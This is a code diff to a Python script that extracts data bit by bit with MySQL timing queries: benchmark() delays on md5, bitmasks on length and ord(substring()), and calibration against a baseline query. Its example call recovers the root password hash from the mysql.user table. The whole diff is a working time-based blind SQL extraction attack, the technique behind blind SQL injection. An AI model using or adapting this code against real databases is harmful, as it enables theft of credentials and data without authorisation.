@@ -11,6 +11,9 @@ db = MySQLdb.connect(host="localhost",user="root", passwd="password", db="mysql"
 
 cur = db.cursor() 
 
+#make iters longer for reliability, smaller for speed
+iters = 500000
+
 def measure(sql):
 	s_time = time.time();
 	cur.execute(sql)
@@ -21,17 +24,18 @@ def measure(sql):
 def getlength(field,table,where):
 	accum = 0
 
-	mintime = 1
+	mintime = measure("select curdate()")
 	
 	for bitpos in [128,64,32,16,8,4,2,1]:
-		sql = "select if(length(%s) & %d,benchmark(50000000,md5('cc')),0) from %s where %s;" % (field,bitpos,table,where)
+		sql = "select if(length(%s) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,bitpos,iters,table,where)
 		_time = measure(sql)
 
-		if _time > mintime:
+		if _time / mintime > 100:
 			bit = 1
 			accum += bitpos
 		else:
 			bit = 0
+
 		print "time:",_time,",bit:",bit
 
 		
@@ -41,14 +45,14 @@ def getlength(field,table,where):
 def getbits(pos,field,table,where):
 	accum = 0
 
-	mintime = 1
+	mintime = measure("select curdate()")
 	
 	for bitpos in [128,64,32,16,8,4,2,1]:
 
-		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(50000000,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,table,where) 
+		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,iters,table,where) 
 		_time = measure(sql)
 		
-		if _time > mintime:
+		if _time / mintime > 100:
 			bit = 1
 			accum += bitpos
 		else:
@@ -71,4 +75,5 @@ def getdata(field,table,where):
 
 # example against mysql users table
 
-print "RECOVERED DATA: "getdata('password','user',"user='root' limit 1")
+data = getdata('password','user',"user='root' limit 1")
+print "RECOVERED DATA:", data
